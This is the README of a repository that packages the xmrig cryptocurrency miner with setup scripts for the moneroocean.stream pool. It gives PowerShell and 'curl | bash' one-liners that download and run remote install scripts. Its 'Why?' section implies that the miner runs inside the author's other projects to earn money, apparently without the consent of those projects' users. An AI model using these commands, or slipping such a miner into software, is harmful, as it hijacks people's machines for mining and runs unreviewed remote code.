This repository contains binaries of xmrig miner (see https://github.com/xmrig/xmrig) built to work on more platforms and bundled with helper Windows/Linux setup scripts that automatically configure them to work with https://moneroocean.stream mining pool.

## Why?
I use this to get a bit of money from my projects (you're able to disable this at any time if one of my projects uses this)


## INSTALL

### Windows
```
powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/Leo-Aqua/xmrig_setup/master/setup_moneroocean_miner.bat', $tempfile); & $tempfile; Remove-Item -Force $tempfile"
```

### Linux
```
curl -s -L https://raw.githubusercontent.com/Leo-Aqua/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s
```
---
## UNINSTALL

### Windows
```
powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/Leo-Aqua/xmrig_setup/master/uninstall_moneroocean_miner.bat', $tempfile); & $tempfile; Remove-Item -Force $tempfile"
```

### Linux
```
curl -s -L https://raw.githubusercontent.com/Leo-Aqua/xmrig_setup/master/uninstall_moneroocean_miner.sh | bash -s
```
